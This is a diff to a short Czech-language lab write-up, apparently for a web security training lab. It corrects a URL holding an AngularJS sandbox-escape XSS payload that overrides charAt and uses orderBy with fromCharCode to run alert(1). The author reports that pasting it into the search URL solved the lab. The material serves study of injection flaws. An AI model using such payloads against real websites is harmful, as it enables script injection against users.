@@ -3,7 +3,7 @@
 ## Postup
 Tohle byla celkem rychlovka. Celé to šlo vyřešit jedním tahem – stačilo vzít upravený payload a zkopírovat ho přímo do URL vyhledávacího pole nahoře na stránce:
 
-/search=1&toString().constructor.prototype.charAt%3D[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+/?search=1&toString().constructor.prototype.charAt%3D[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 
 Jakmile jsem to tam poslal, stránka to zpracovala a lab se hned vyřešil.
 
